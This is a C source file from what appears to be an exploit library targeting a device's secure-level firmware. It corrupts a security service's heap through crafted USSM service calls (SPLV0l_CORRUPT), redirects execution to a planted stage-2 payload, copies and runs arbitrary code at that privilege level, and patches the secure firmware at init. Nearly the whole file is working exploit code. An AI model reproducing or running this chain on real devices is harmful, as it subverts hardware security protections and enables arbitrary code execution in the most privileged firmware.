#include "libspl-int.h"

#include "libspl.h"
#include "libspl-lv0.h"

#include "lspl_others.nmp.h"
#include "lspl_lv0p.nmp.h"
#include "lspl_lv0p_noc.nmp.h"

static uint8_t *SPLV0l_FINDOPE(uint8_t *cur, enum SPLOP_DOMAINS domain, int find, uint32_t fw) {
    if (!cur)
        cur = lspl_others_nmp;
    uint8_t *end = lspl_others_nmp + sizeof(lspl_others_nmp);
    return SPLl_FINDOPE(end, cur, domain, find, fw);
}

static int SPLV0l_CORRUPT(void *buf4k, uint32_t start, uint32_t end) {
    SPLi_MEMSET(buf4k, 0, sizeof(struct splv0_cmd_s) + sizeof(struct splv0_ussm5_carg_s));
    struct splv0_cmd_s* cmd = (struct splv0_cmd_s*)buf4k;
    cmd->size = sizeof(struct splv0_cmd_s) + sizeof(struct splv0_ussm5_carg_s);
    cmd->service_id = 0x50002;
    struct splv0_ussm5_carg_s* cargs = (struct splv0_ussm5_carg_s*)cmd->arg;
    cargs->list_count = 3;
	cargs->total_count = 1;
	cargs->palist[0].addr = cargs->palist[1].addr = 0x50000000;
	cargs->palist[0].length = cargs->palist[1].length = 0x10;
    int ret = 0;
    for (uint32_t addr = start; addr <= end; addr += 4) {
        cargs->palist[2].length = addr - 0x14; // offsetof(struct ussm_heap_hdr_s, next);
        ret = SPLi_CALLUSSM(buf4k);
        if (ret < 0 && ((uint32_t)cmd->response != 0x800F0216)) {
            SPLi_ERROR("USSMC(0x%08X) = 0x%08X|0x%08X\n", addr, ret, (uint32_t)cmd->response);
            return -SPL_LV0FC_EUSSMC;
        }
    }
    return 0;
}

int SPLx_LV0_BCOMMEM(enum SPLV0_COMMEMS idx, enum SPLV0_COMMBACKUP_MODES backup_mode, bool restore) {
    if (SPLl_ROOTCHK(false) < 0)
        return -SPL_EBADROOT;
    if (idx < SPLV0_COMMEM_TZS || idx >= SPLV0_COMMEM__COUNT)
        return -SPL_LV0FC_E404;
    if (!spl_root->lv0.commem[idx].va || !spl_root->lv0.commem[idx].pa || !spl_root->lv0.commem[idx].sz)
        return -SPL_LV0BC_EBADCPARM;
    switch (backup_mode) {
        case SPLV0_COMMBACKUP_NEVER: return 0;
        case SPLV0_COMMBACKUP_CRITICAL:
            if (idx != SPLV0_COMMEM_SMALL)
                return 0;
            break;
        default: break;
    }
    if (restore) {
        if (!spl_root->lv0.commem[idx].backup)
            return -SPL_LV0BC_ENOBACKUP;
        SPLi_MEMCPY(spl_root->lv0.commem[idx].va, spl_root->lv0.commem[idx].backup, spl_root->lv0.commem[idx].sz);
        SPLi_FREE(spl_root->lv0.commem[idx].backup);
        spl_root->lv0.commem[idx].backup = NULL;
        SPLl_ROOTCHK(true);
        return 1;
    }
    if (spl_root->lv0.commem[idx].backup)
        return 0;
    spl_root->lv0.commem[idx].backup = (void*)SPLi_MALLOC(spl_root->lv0.commem[idx].sz);

    SPLl_ROOTCHK(true);

    if (!spl_root->lv0.commem[idx].backup)
        return -SPL_LV0BC_ENOBMALLOC;
    SPLi_MEMCPY(spl_root->lv0.commem[idx].backup, spl_root->lv0.commem[idx].va, spl_root->lv0.commem[idx].sz);
    return 1;
}

int SPLx_LV0_ACOMMEM(enum SPLV0_COMMEMS idx, bool busyf) {
    if (SPLl_ROOTCHK(false) < 0)
        return -SPL_EBADROOT;
    if (idx < SPLV0_COMMEM_TZS || idx >= SPLV0_COMMEM__COUNT)
        return -SPL_LV0FC_E404;
    if ((uint32_t)busyf < 2) {
        spl_root->lv0.commem[idx].busy = busyf;
        SPLl_ROOTCHK(true);
    }
    return spl_root->lv0.commem[idx].busy;
}

int SPLx_LV0_FCOMMEM(int minsz, bool alloc, bool wait, bool respect_busy) {
    if (SPLl_ROOTCHK(false) < 0)
        return -SPL_EBADROOT;
    bool encommem0 = false;
#ifndef SPLT_NOTZS
    encommem0 = spl_root->tzs.initialized;
#endif // SPLT_NOTZS
    for (int i = !encommem0; i < SPLV0_COMMEM__COUNT; i++) {
        if ((spl_root->lv0.commem[i].sz >= minsz) && spl_root->lv0.commem[i].va && spl_root->lv0.commem[i].pa) {
            if (respect_busy) {
                if (spl_root->lv0.commem[i].busy) {
                    if (i != (SPLV0_COMMEM__COUNT - 1)) // last one is the biggest so it will always fit, and we can maybe use now
                        continue;
                    if (!wait)
                        return -SPL_LV0FC_EBUSY;
                    do ; while (spl_root->lv0.commem[i].busy);
                }
                spl_root->lv0.commem[i].busy = true;
                SPLl_ROOTCHK(true); 
            }
            return i;
        }
    }
    if (alloc) {
        int commidx = SPLV0_COMMEM_SMALL;
        if (minsz > SPLV0_COMMEM_SIZE) {
            if (minsz > SPLV0_COMMBIG_SIZE)
                return -SPL_LV0FC_ETOOBIG;
            commidx = SPLV0_COMMEM_LARGE;
            spl_root->lv0.commem[commidx].pa = SPLV0_COMMBIG_PA;
            spl_root->lv0.commem[commidx].sz = SPLV0_COMMBIG_SIZE;
        } else {
            spl_root->lv0.commem[commidx].pa = SPLV0_COMMEM_PA;
            spl_root->lv0.commem[commidx].sz = SPLV0_COMMEM_SIZE;
        }
        spl_root->lv0.commem[commidx].va = (void*)SPLi_PALLOC(spl_root->lv0.commem[commidx].pa, spl_root->lv0.commem[commidx].sz);
        if (respect_busy && spl_root->lv0.commem[commidx].va)
            spl_root->lv0.commem[commidx].busy = true;
        SPLl_ROOTCHK(true);
        if (!spl_root->lv0.commem[commidx].va)
            return -SPL_LV0FC_ENOPALLOC;
        return commidx;
    }
    return -SPL_LV0FC_E404;
}

static int SPLV0l_USSMXS2(uint32_t s2pa, uint32_t *s2jmpbap) {
    uint32_t indir = 0;
    uint32_t *pair = NULL;
    uint32_t *s2_cpar = (uint32_t *)SPLV0l_FINDOPE(NULL, SPLOPD_LV0_STAGE2, SPLS2E_U5C_DIRJMP, spl_root->fw);
    if (!s2_cpar) {
        s2_cpar = (uint32_t *)SPLV0l_FINDOPE(NULL, SPLOPD_LV0_STAGE2, SPLS2E_U5C_INDIRJMP, spl_root->fw);
        if (!s2_cpar)
            return -SPL_LV0UXS2_ENOPAFCOMM;
        pair = &s2_cpar[SPLS2T3M_PAIRS];
        indir = s2_cpar[SPLS2T3M_JMPOA];
        *s2jmpbap = s2_cpar[SPLS2T3M_JMPBA];
    } else {
        pair = &s2_cpar[SPLS2T2M_PAIRS];
        *s2jmpbap = s2_cpar[SPLS2T2M_JMPBA];
    }

    SPLi_DEBUG("USSMXS2: s2pa=0x%08X, s2jmpbap=0x%08X(0x%08X)\n", s2pa, s2jmpbap, (s2jmpbap ? *s2jmpbap : 0));

    void *buf4k = SPLi_MALLOC(0x1000);
    if (!buf4k)
        return -SPL_LV0UXS2_ENOMALLOC;
    SPLi_MEMSET(buf4k, 0, 0x1000);
    int ret = SPLi_LOADUSSM();
    if (ret < 0) {
        SPLi_FREE(buf4k);
        return ret;
    }
    while ((pair[0] & SPLOP_MMASK) != SPLOP_MAGIC) {
        ret = SPLV0l_CORRUPT(buf4k, pair[0], pair[1]);
        if (ret < 0)
            goto l_spllv0_ussmxs2_ux;
        pair += 2;
    }

    struct splv0_cmd_s *cmd = (struct splv0_cmd_s *)buf4k;
    if (indir) {
        SPLi_MEMSET(buf4k, 0, 0x1000);
        cmd->arg[0] = 1;
        cmd->arg[1] = 1;
        cmd->arg[2] = s2pa;
        cmd->arg[3] = s2pa;
        cmd->arg[4] = s2pa;
        cmd->size = sizeof(struct splv0_cmd_s) + 0x20;
        cmd->service_id = 0xD0002;
        ret = SPLi_CALLUSSM(buf4k);
        if (ret < 0)
            goto l_spllv0_ussmxs2_ux;
        s2pa = indir;
    }
    SPLi_MEMSET(buf4k, 0, 0x1000);
    cmd->arg[0] = s2pa;
    cmd->size = sizeof(struct splv0_cmd_s) + 0x20;
    cmd->service_id = 0xD0002;
    ret = SPLi_CALLUSSM(buf4k);

l_spllv0_ussmxs2_ux:
    SPLi_UNLOADUSSM();
    SPLi_FREE(buf4k);
    return ret;
}

int SPLx_LV0_EXEC(struct splv0_exec_arg_s *xarg, enum SPLV0_COMMBACKUP_MODES backup_mode) {
    if (SPLl_ROOTCHK(false) < 0)
        return -SPL_EBADROOT;
    if (!xarg)
        return -SPL_EBADARG;
    SPLi_DEBUG("SPLx_LV0_EXEC(xarg=0x%08X, backup_mode=%d, wait=%d)\n payload=0x%08X, size=0x%08X, pa_pa=0x%08X, stack=0x%08X\n args={0x%08X, 0x%08X, 0x%08X, 0x%08X}\n", xarg, backup_mode, xarg->wait, xarg->payload, xarg->size, xarg->pa_pa, xarg->stack, xarg->arg[0], xarg->arg[1], xarg->arg[2], xarg->arg[3]);
    if (spl_root->lv0.xbusy) {
        if (!xarg->wait) // TODO: wait=tiemout
            return -SPL_LV0X_EBUSY;
        do ; while (spl_root->lv0.xbusy);
    }
    spl_root->lv0.xbusy = 1;
    SPLl_ROOTCHK(true);

    void *pdva = NULL;
    int commidx = -1, commidx_c = -1, ret = 0;
    bool fpalloc = false, fcommcb = false, fcommb = false;
    if (!(xarg->pa_pa & 1)) {
        if (!xarg->payload || !xarg->size) {
            spl_root->lv0.xbusy = 0;
            SPLl_ROOTCHK(true);
            return -SPL_EBADARG;
        }
        if (!xarg->pa_pa) {
            commidx = SPLx_LV0_FCOMMEM(xarg->size + SPLS2T1_MAXSZ, true, xarg->wait, true);
            if (commidx < 0) {
                ret = -SPL_LV0X_ENOPAFCOMM;
                goto l_splv0x_cleanup;
            }
            commidx_c = commidx;
            xarg->pa_pa = spl_root->lv0.commem[commidx].pa + SPLS2T1_MAXSZ;
            pdva = (void*)((uint32_t)spl_root->lv0.commem[commidx].va + SPLS2T1_MAXSZ);
            ret = SPLx_LV0_BCOMMEM(commidx_c, backup_mode, false);
            if (ret < 0)
                goto l_splv0x_cleanup;
            fcommcb = ret;
        } else {
            pdva = SPLi_PALLOC(xarg->pa_pa, xarg->size);
            if (!pdva) {
                ret = -SPL_LV0X_ENOPAPALLOC;
                goto l_splv0x_cleanup;
            }
            fpalloc = true;
        }
        SPLi_MEMCPY(pdva, xarg->payload, xarg->size);
    } else // already in place
        xarg->pa_pa &= ~1;

    bool hasdirptr = spl_root->tzs.initialized ? !!spl_tzs_write32 : false;
    if (commidx < 0 || (!hasdirptr && (commidx != SPLV0_COMMEM_SMALL)))
        commidx = SPLx_LV0_FCOMMEM(SPLS2T1_MAXSZ, true, xarg->wait, true);
    if (commidx < 0 || (!hasdirptr && (commidx != SPLV0_COMMEM_SMALL))) {
        ret = -SPL_LV0X_ENOPAFCOMM;
        goto l_splv0x_cleanup;
    }
    ret = SPLx_LV0_BCOMMEM(commidx, backup_mode, false);
    if (ret < 0)
        goto l_splv0x_cleanup;
    fcommb = ret;

    splv0_t1s2pb_t *s2p = (splv0_t1s2pb_t *)(spl_root->lv0.commem[commidx].va);
    s2p->skfcmdid = 0;
    void *s2v = (void *)SPLV0l_FINDOPE(NULL, SPLOPD_LV0_STAGE2, SPLS2E_PAYLOAD, spl_root->fw);
    s2v = &((uint32_t *)s2v)[SPLS2T1M_CODE];
    uint32_t tmp = s2v ? (uint32_t)SPLV0l_FINDOPE((s2v + 1), SPLOPD_ANY, -1, (uint32_t)-1) : 0;
    if (!s2v || !tmp || ((tmp - (uint32_t)s2v) <= SPLS2T1_MINSZ)) {
        ret = -SPL_LV0X_EBADICFG;
        goto l_splv0x_cleanup;
    }
    SPLi_MEMCPY((void *)&s2p->_start, s2v, (tmp - (uint32_t)s2v));

    s2p->src = spl_root->lv0.commem[commidx].pa + 4;
    s2p->func = xarg->pa_pa;
    for (int i = 0; i < 4; i++)
        s2p->arg[i] = (xarg->arg[i] == (SPLV0_ARG2PAPA_FLAG + i)) ? xarg->pa_pa : xarg->arg[i];
    s2p->sp = xarg->stack;

    ret = 0;
    if (spl_root->lv0.initialized) {
        if (hasdirptr) {
            spl_tzs_write32(0xE0000010, s2p->src);
            ret = 0;
        } else {
            s2p->skfcmdid = SPLV0_SKFCMDID;
            ret = SPLV0_CALLSK(0);
        }
    } else
        ret = SPLV0l_USSMXS2(s2p->src, (uint32_t *)&s2p->s2t1jmpba);
    if (ret >= 0) {
        do ; while (s2p->status == (spl_root->lv0.commem[commidx].pa + 4)); // didnt exec yet
        do ; while (s2p->status == (uint32_t)s2p->func); // started exec
        xarg->xret = (int)s2p->ret;
        SPLi_DEBUG("SPLx_LV0_EXEC s2r= 0x%08X\n", (uint32_t)xarg, xarg->xret);
    }

l_splv0x_cleanup:
    if (fcommb)
        SPLx_LV0_BCOMMEM(fcommb, backup_mode, true);
    if (fcommcb)
        SPLx_LV0_BCOMMEM(fcommcb, backup_mode, true);
    if (fpalloc)
        SPLi_PFREE(pdva);
    SPLx_LV0_ACOMMEM(commidx, false);
    SPLx_LV0_ACOMMEM(commidx_c, false);
    spl_root->lv0.xbusy = 0;
    SPLl_ROOTCHK(true);
    return ret;
}

int SPLx_LV0_FASTCMD(int fcmd, uint32_t *args, int *fret, enum SPLV0_COMMBACKUP_MODES backup_mode) {
    if (SPLl_ROOTCHK(false) < 0) {
        if (fret)
            *fret = -SPL_EBADROOT;
        return 0;
    }
    struct splv0_exec_arg_s xarg;
    SPLi_MEMSET(&xarg, 0, sizeof(struct splv0_exec_arg_s));
    xarg.pa_pa = fcmd | 1;
    if (args)
        SPLi_MEMCPY(xarg.arg, args, sizeof(xarg.arg));
    int ret = SPLx_LV0_EXEC(&xarg, backup_mode);
    if (fret)
        *fret = ret;
    return xarg.xret;
}

static int SPLl_LV0_WRITE32(uint32_t addr, uint32_t value) {
    int ret = 0;
    SPLx_LV0_WRITE32(addr, value, &ret, SPLV0_COMMBACKUP_CRITICAL);
    return ret;
}

int SPLx_LV0P(struct splv0p_arg_s *varg, enum SPLV0_COMMBACKUP_MODES backup_mode) {
    if (SPLl_ROOTCHK(false) < 0)
        return -SPL_EBADROOT;
    if (!varg->gsize || !varg->nmp.va || !varg->nmp.size || !varg->j)
        return -SPL_EBADARG;
    int gsize = SPL_PALIGN(varg->gsize) + (SPLS2T1_MAXSZ + SPL_PALIGN(varg->nmp.size));
    int commidx = SPLx_LV0_FCOMMEM(gsize, true, varg->wait, true);
    if (commidx < 0)
        return -SPL_LV0P_ENOPAFCOMM;
    bool fcommb = false;
    int ret = SPLx_LV0_BCOMMEM(commidx, backup_mode, false);
    if (ret < 0)
        goto l_splv0p_cleanup;
    fcommb = ret;
    
    void *va = spl_root->lv0.commem[commidx].va;
    uint32_t pa = spl_root->lv0.commem[commidx].pa;
    int e_off = SPLS2T1_MAXSZ;
    uint32_t ppa = pa + e_off;
    SPLi_MEMCPY(va + e_off, varg->nmp.va, varg->nmp.size);
    e_off += SPL_PALIGN(varg->nmp.size);
    SPLi_MEMSET((void *)((uint32_t)va + e_off), 0, SPL_PALIGN(varg->gsize));

    uint32_t j_pa = pa + e_off;
    struct splv0p_j_s *cj = varg->j;
    struct splv0p_j_s *vj = NULL;
    uint32_t *pj = NULL;
    int jn = 0;
    while (cj) {
        if (e_off + sizeof(struct splv0p_j_s) > gsize) {
            ret = -SPL_LV0P_ETOOBIG;
            goto l_splv0p_cleanup;
        }
        vj = (struct splv0p_j_s *)((uint8_t *)va + e_off);
        if (pj)
            *pj = pa + e_off;
        SPLi_DEBUG("SPLx_LV0P creating job %d(%d) at 0x%08X (src=0x%08X)\n", jn, cj->idx, pa+e_off, (uint32_t)cj);
        e_off += SPL_PALIGN(sizeof(struct splv0p_j_s));
        SPLi_MEMCPY(vj->jbuf, cj->jbuf, sizeof(vj->jbuf));

        vj->magic = 0;
        switch (cj->idx) {
            case LV0P_JOB_NOP:
            case LV0P_JOB_KSP:
            break; case LV0P_JOB_DAT:
                if ((e_off + (!(vj->d.ncopyin) * SPL_PALIGN(vj->d.size))) > gsize) {
                    ret = -SPL_LV0P_ETOOBIG;
                    goto l_splv0p_cleanup;
                }
                if (vj->d.ncopyin)
                    vj->d.src = cj->d.src;
                else {
                    SPLi_MEMCPY(va + e_off, vj->d.src_va, vj->d.size);
                    vj->d.src = pa + e_off;
                    e_off += SPL_PALIGN(vj->d.size);
                }
            break; case LV0P_JOB_EXE:
                if (vj->x.size) {
                    if ((e_off + SPL_PALIGN(vj->x.size)) > gsize) {
                        ret = -SPL_LV0P_ETOOBIG;
                        goto l_splv0p_cleanup;
                    }
                    SPLi_MEMCPY(va + e_off, vj->x.src_va, vj->x.size);
                    vj->x.addr = pa + e_off;
                    e_off += SPL_PALIGN(vj->x.size);
                }
            break; case LV0P_JOB_CUS:
            break; default:
                ret = -SPL_LV0P_EUNKJOB;
                goto l_splv0p_cleanup;
        }
        vj->ret = -1;
        vj->idx = cj->idx;
        vj->magic = SPLV0P_JOB_MAGIC;

        cj = cj->next;
        pj = &vj->next_pa;
        jn++;
    }

    /*
    SPLi_DEBUG("LV0P: va=%p, gsize=%d\n", va, gsize);
    uint8_t *bv = (uint8_t *)va;
    for (uint32_t o = 0; o < gsize; o += 0x10) {
        SPLi_DEBUG("%08X: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X\n",
            o,
            bv[o], bv[o+1], bv[o+2], bv[o+3],
            bv[o+4], bv[o+5], bv[o+6], bv[o+7],
            bv[o+8], bv[o+9], bv[o+10], bv[o+11],
            bv[o+12], bv[o+13], bv[o+14], bv[o+15]);
    }*/

    struct splv0_exec_arg_s xarg = {
        .payload = NULL,
        .size = 0,
        .pa_pa = ppa | 1,
        .stack = varg->stack,
        .wait = varg->wait,
        .arg = { ppa, j_pa, 0, 0 },
        .xret = 0
    };
    SPLx_LV0_ACOMMEM(commidx, false);
    ret = SPLx_LV0_EXEC(&xarg, backup_mode);
    if (ret < 0)
        goto l_splv0p_cleanup;
    if (xarg.xret < 0) {
        ret = -SPL_LV0P_EPAYLERR;
        goto l_splv0p_cleanup;
    }
    if (!varg->copy_rets)
        goto l_splv0p_cleanup;
    SPLx_LV0_ACOMMEM(commidx, true); // race conditions but ehh

    e_off = (j_pa - pa);
    cj = varg->j;
    vj = NULL;
    jn = 0;
    while (cj) {
        vj = (struct splv0p_j_s *)((uint8_t *)va + e_off);
        if (cj->idx != vj->idx)
            SPLi_ERROR("BUG: SPLx_LV0P job %d idx mismatch: cj=%d vj=%d, ignoring..\n", jn, cj->idx, vj->idx);
        SPLi_DEBUG("SPLx_LV0P job %d(%d) ret=0x%08X\n", jn, vj->idx, vj->ret);
        cj->ret = vj->ret;
        if (cj->idx == LV0P_JOB_CUS)
            SPLi_MEMCPY(cj->c, vj->c, sizeof(cj->c));
        if (!vj->next || !cj->next)
            break;
        e_off = (int)(vj->next_pa - pa);
        cj = cj->next;
        jn++;
    }

l_splv0p_cleanup:
    if (fcommb)
        SPLx_LV0_BCOMMEM(commidx, backup_mode, true);
    SPLx_LV0_ACOMMEM(commidx, false);
    return ret;
}

int SPLx_LV0_INIT(spl_lv0p_nmp_t nmp, bool wait, enum SPLV0_COMMBACKUP_MODES backup_mode) {
    if (SPLl_ROOTCHK(false) < 0)
        return -SPL_EBADROOT;
    if (spl_root->lv0.initialized)
        return 0;
    
    uint8_t *oppos = SPLV0l_FINDOPE(NULL, SPLOPD_LV0_SKFCHP, SPLSKFCHPE_SIMPLE, spl_root->fw);
    if (!oppos)
        return -SPL_LV0I_EBADICFG;
    oppos += ((SPLOPEM_UNIQ - 1) * sizeof(uint32_t));

    int gsize = 0, np = 0;
    struct splv0p_j_s patches[SPLSKFCHP_MAX_ENTRIES + 1];
    SPLi_MEMSET(patches, 0, sizeof(patches));
    struct splv0p_j_s *cj = NULL;
    struct splv0p_j_s **pj = NULL;
    for (np = 0; np < SPLSKFCHP_MAX_ENTRIES; np++) {
        oppos += sizeof(uint32_t); // magic->dst
        cj = &patches[np];
        cj->idx = LV0P_JOB_DAT;
        cj->d.dst = *(uint32_t *)oppos;
        oppos += sizeof(uint32_t); // dst->data
        cj->d.src_va = oppos;
        oppos = SPLV0l_FINDOPE(&oppos[1], SPLOPD_ANY, -1, (uint32_t)-1); // data->next
        if (!oppos)
            return -SPL_LV0I_EBADICFG;
        cj->d.size = ((uint32_t)oppos - (uint32_t)cj->d.src_va);
        cj->d.ncopyin = false;
        if (pj)
            *pj = cj;
        pj = &cj->next;
        gsize += (SPL_PALIGN(sizeof(struct splv0p_j_s)) + SPL_PALIGN(cj->d.size));
        if (*(uint32_t *)oppos != SPLOPDEV(SPLOPD_LV0_SKFCHP, SPLOPDE_EXTEND))
            break;
    }
    np++;
    patches[np].idx = LV0P_JOB_DAT;
    patches[np].d.src = DEVNULL_OFFSET;
    patches[np].d.dst = SPLTZ_DDRFWAE_U64OFF;
    patches[np].d.size = 8;
    patches[np].d.ncopyin = true;
    patches[np].next = NULL;
    if (pj)
        *pj = &patches[np];
    gsize += SPL_PALIGN(sizeof(struct splv0p_j_s));

    struct splv0p_arg_s varg = {
        .gsize = gsize,
        .stack = 0,
        .nmp = { .va = nmp.va, .size = nmp.size },
        .j = patches,
        .wait = wait,
        .copy_rets = false, // true for dbg
    };
    int ret = SPLx_LV0P(&varg, backup_mode);
    if (ret < 0)
        return ret;

    spl_lv0_write32 = SPLl_LV0_WRITE32;
    spl_root->lv0.initialized = true;
    SPLl_ROOTCHK(true);
    int val = SPLx_LV0_READ32(0xE0010004, &ret, backup_mode);
    if ((ret < 0) || (val >= 0)) { // E001_4 should always have bit31 set
        SPLi_ERROR("SPLx_LV0_INIT: E001_4 check failed, val=0x%08X, ret=%d\n", val, ret);
        spl_root->lv0.initialized = false;
        spl_lv0_write32 = NULL;
        SPLl_ROOTCHK(true);
        return -SPL_LV0I_EBADTEST;
    }

    spl_root->tzs.fw_dropped = true;
    SPLl_ROOTCHK(true);
    return 0;
}

int SPLx_LV0_DEINIT(void) {
    if (SPLl_ROOTCHK(false) < 0)
        return -SPL_EBADROOT;
    spl_root->lv0.initialized = false;
    spl_root->lv0.xbusy = false;
    spl_lv0_write32 = NULL;
    for (int i = 0; i < SPLV0_COMMEM__COUNT; i++) {
        if (spl_root->lv0.commem[i].va)
            SPLi_PFREE(spl_root->lv0.commem[i].va);
    }
    SPLi_MEMSET(&spl_root->lv0, 0, sizeof(spl_root->lv0));
    SPLl_ROOTCHK(true);
    return 0;
}